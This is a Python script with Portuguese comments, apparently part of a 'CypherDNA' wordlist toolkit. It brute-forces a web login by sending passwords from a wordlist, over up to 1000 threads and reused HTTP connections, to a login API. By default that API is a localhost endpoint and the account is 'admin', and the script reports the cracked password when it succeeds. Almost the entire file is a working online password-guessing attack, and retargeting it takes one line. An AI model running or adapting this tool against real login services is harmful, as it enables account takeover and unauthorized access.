#!/usr/bin/env python3
"""
CypherDNA Crack Target Client - Versão de Alta Performance
"""

import sys
import os
import time
import requests  # Substituído urllib por requests para usar HTTP Keep-Alive
from concurrent.futures import ThreadPoolExecutor
from rich.console import Console
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TaskProgressColumn

console = Console()

TARGET_URL = "http://localhost:5000/api/login"
DEFAULT_USER = "admin"

# Usamos um objeto Session global para reaproveitar conexões TCP entre as threads
session = requests.Session()
adapter = requests.adapters.HTTPAdapter(pool_connections=100, pool_maxsize=100)
session.mount('http://', adapter)

def find_latest_wordlist():
    base_dirs = [
        os.path.join(os.path.dirname(__file__), "..", "output", "wordlists"),
        os.path.join(os.path.dirname(__file__), "..", "you_wordlist"),
        os.path.join(os.path.dirname(__file__), "..", "You_wordlist"),
        os.path.join(os.path.dirname(__file__), "you_wordlist"),
    ]
    all_files = []
    for d in base_dirs:
        if os.path.exists(d):
            all_files.extend([os.path.join(d, f) for f in os.listdir(d) if f.endswith(".txt")])
    if not all_files:
        return None
    return max(all_files, key=os.path.getmtime)

def try_password(password, username=DEFAULT_USER):
    try:
        # requests.Session() gerencia o pool de conexões automaticamente
        resp = session.post(
            TARGET_URL, 
            json={"username": username, "password": password}, 
            timeout=2
        )
        if resp.status_code == 200:
            return True
    except Exception:
        pass
    return False

def run_crack(wordlist_path, username=DEFAULT_USER, threads=1000): # Aumentado padrão de threads
    if not os.path.exists(wordlist_path):
        console.print(f"[bold red][!] Arquivo de wordlist não encontrado: {wordlist_path}[/bold red]")
        return

    console.print(Panel.fit(
        f"[bold cyan]CYPHERDNA - CRACK TARGET RUNNER (OTIMIZADO)[/bold cyan]\n\n"
        f"[bold white]📄 Wordlist:[/bold white] {os.path.basename(wordlist_path)}\n"
        f"[bold white]🌐 Target URL:[/bold white] {TARGET_URL}\n"
        f"[bold white]👤 Usuário Alvo:[/bold white] {username}\n"
        f"[bold white]⚡ Threads:[/bold white] {threads}",
        border_style="cyan"
    ))

    with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
        passwords = [line.strip() for line in f if line.strip()]

    total_words = len(passwords)
    console.print(f"[bold green][+] Carregadas {total_words:,} senhas da wordlist.[/bold green]\n")

    start_time = time.time()
    found_password = None
    found_line = None

    with Progress(
        SpinnerColumn(),
        TextColumn("[bold cyan]{task.description}"),
        BarColumn(),
        TaskProgressColumn(),
        console=console
    ) as progress:
        task = progress.add_task("Testando senhas no Servidor Alvo...", total=total_words)

        with ThreadPoolExecutor(max_workers=threads) as executor:
            # Enviamos as tarefas para o pool
            futures = {executor.submit(try_password, p, username): (i + 1, p) for i, p in enumerate(passwords)}

            # Contador local para evitar gargalo de renderização da tela
            batch_counter = 0

            for future in futures:
                line_no, p = futures[future]
                
                # Otimização da Interface: Atualiza a barra a cada 20 requisições
                batch_counter += 1
                if batch_counter >= 500:
                    progress.advance(task, batch_counter)
                    batch_counter = 0
                
                try:
                    is_success = future.result()
                    if is_success:
                        found_password = p
                        found_line = line_no
                        # Cancela as tarefas restantes no executor para encerrar rápido
                        executor.shutdown(wait=False, cancel_futures=True)
                        break
                except Exception:
                    pass
            
            # Limpa o saldo restante do contador na barra de progresso
            if batch_counter > 0:
                progress.advance(task, batch_counter)

    elapsed = time.time() - start_time

    if found_password:
        console.print("\n")
        console.print(Panel.fit(
            f"[bold gold1]🎉 SENHA CRACKEADA COM SUCESSO! 🎉[/bold gold1]\n\n"
            f"[bold white]🔑 Senha Correta:[/bold white] [bold green]{found_password}[/bold green]\n"
            f"[bold white]📍 Posição na Wordlist:[/bold white] Linha {found_line:,} de {total_words:,}\n"
            f"[bold white]⏱️ Tempo Decorrido:[/bold white] {elapsed:.2f} segundos\n"
            f"[bold white]🚀 Velocidade Média:[/bold white] {found_line / max(0.001, elapsed):.1f} requisições/seg",
            border_style="green"
        ))
    else:
        console.print("\n[bold red]❌ A senha alvo não foi encontrada nesta wordlist. Tente gerar novas combinações no CypherDNA![/bold red]")

if __name__ == '__main__':
    wl = sys.argv[1] if len(sys.argv) > 1 else find_latest_wordlist()
    if not wl:
        console.print("[bold red][!] Nenhuma wordlist encontrada na pasta you_wordlist/. Gere uma no CypherDNA primeiro![/bold red]")
        sys.exit(1)
    
    user = sys.argv[2] if len(sys.argv) > 2 else DEFAULT_USER
    run_crack(wl, user)
